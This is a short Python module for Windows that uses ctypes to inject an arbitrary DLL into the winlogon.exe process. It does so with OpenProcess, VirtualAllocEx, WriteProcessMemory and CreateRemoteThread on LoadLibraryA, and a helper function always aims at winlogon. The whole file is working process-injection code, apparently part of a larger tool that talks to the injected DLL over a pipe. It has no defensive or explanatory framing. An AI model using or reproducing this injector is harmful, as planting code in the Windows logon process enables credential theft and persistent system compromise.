import ctypes
import psutil
import os
import time

kernel32 = ctypes.windll.kernel32
PROCESS_ALL_ACCESS = 0x1F0FFF
MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_READWRITE = 0x04

def get_pid(process_name):
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] and proc.info['name'].lower() == process_name.lower():
            return proc.info['pid']
    return None

def inject_dll(pid, dll_path):
    if not os.path.exists(dll_path):
        return False
        
    dll_path_bytes = dll_path.encode('utf-8')
    h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    if not h_process:
        return False

    arg_address = kernel32.VirtualAllocEx(h_process, 0, len(dll_path_bytes) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
    if not arg_address:
        kernel32.CloseHandle(h_process)
        return False

    written = ctypes.c_size_t(0)
    kernel32.WriteProcessMemory(h_process, arg_address, dll_path_bytes, len(dll_path_bytes) + 1, ctypes.byref(written))

    h_kernel32 = kernel32.GetModuleHandleW("kernel32.dll")
    h_loadlib = kernel32.GetProcAddress(h_kernel32, b"LoadLibraryA")

    thread_id = ctypes.c_ulong(0)
    h_thread = kernel32.CreateRemoteThread(h_process, None, 0, h_loadlib, arg_address, 0, ctypes.byref(thread_id))
    
    if h_thread:
        kernel32.WaitForSingleObject(h_thread, 5000)
        kernel32.CloseHandle(h_thread)
    
    kernel32.VirtualFreeEx(h_process, arg_address, 0, 0x8000) # MEM_RELEASE
    kernel32.CloseHandle(h_process)
    return True

def ensure_injected(dll_path):
    pid = get_pid("winlogon.exe")
    if pid:
        # Check if already injected by some means, or just inject
        # In a real scenario we'd check loaded modules, but for now we just inject.
        # It's better to rely on the pipe connection to know if it's running.
        inject_dll(pid, dll_path)
